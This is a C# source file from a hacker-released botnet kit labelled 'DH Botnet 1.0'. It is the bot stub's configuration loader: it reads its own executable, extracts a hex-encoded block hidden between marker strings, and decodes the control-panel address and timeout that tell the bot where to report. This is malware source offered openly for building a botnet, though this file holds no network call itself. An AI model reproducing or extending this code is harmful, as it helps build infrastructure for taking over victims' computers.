// DH Botnet 1.0
// (C) Doddy Hackman 2014

using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Stub
{
    class load_config
    {
        string botnet_online_config = "";
        string pagina_config = "";
        string timeout_config = "";

        public string botnet_online
        {
            set { botnet_online_config = value; }
            get { return botnet_online_config; }
        }

        public string pagina
        {
            set { pagina_config = value; }
            get { return pagina_config; }
        }

        public string timeout
        {
            set { timeout_config = value; }
            get { return timeout_config; }
        }

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();
        }

        public load_config()
        {

            string botnet_online_config = "";
            string pagina_config = "";
            string timeout_config = "";
        }

        public void load_data()
        {
            StreamReader viendo = new StreamReader(Application.ExecutablePath);
            string contenido = viendo.ReadToEnd();
            Match regex = Regex.Match(contenido, "-63686175-(.*?)-63686175-", RegexOptions.IgnoreCase);

            if (regex.Success)
            {
                string comandos = regex.Groups[1].Value;
                if (comandos != "" || comandos != " ")
                {

                    botnet_online_config = "1";

                    string leyendo = hexdecode(comandos);
                    regex = Regex.Match(leyendo, "pagina-(.*)-pagina-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        pagina_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "timeout-(.*)-timeout-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        timeout_config = regex.Groups[1].Value;
                    }

                }
                else
                {
                    botnet_online_config = "0";
                }
            }
        }

        public string get_data()
        {
            string lista = "";

            lista = "[+] Botnet Online : " +botnet_online_config+"\n"+
                    "[+] Pagina : "+pagina_config+"\n"+
                    "[+] Timeout : "+timeout_config+"\n";

            return lista;
        }

    }
}

// The End ?